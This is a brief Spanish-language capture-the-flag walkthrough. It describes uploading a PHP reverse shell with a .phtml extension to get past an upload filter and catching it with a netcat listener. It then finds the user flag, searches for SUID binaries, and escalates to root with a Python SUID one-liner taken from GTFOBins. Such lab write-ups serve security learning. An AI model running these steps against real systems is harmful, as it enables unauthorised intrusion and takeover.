Ports 80,22 

-Hacemos fuzzing y encontramos una ruta /panel para subir archivos y un directorio /uploads, donde vemos los archivos subidos.
-Subimos un archivo con una reverse-shell (La de Pentest Monkey) en php. Cambiamos la extension a .phtml(la extension .php no esta permitida). Despues nos vamos a /uploads y la ejecutamos(escuchamos con netcat en nuestro equipo).

nc -lvp 1234              

-Para encontrar la flag de user.txt filtramos de la siguiente manera:
find / -name user.txt 2>/dev/null
Se encuentra aqui:
/var/www/user.txt
-Para escalar privilegios buscamos archivos con permisos SUID, Se puede hacer de estas 2 maneras:
find / -perm -4000 2>/dev/null                find  / -user root -perm /4000

-Encontramos el siguiente binario vulnerable-->/usr/bin/python. Vamos a gtfobins, escribimos python, vamos al apartado SUID y escribimos la segunda linea:

./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root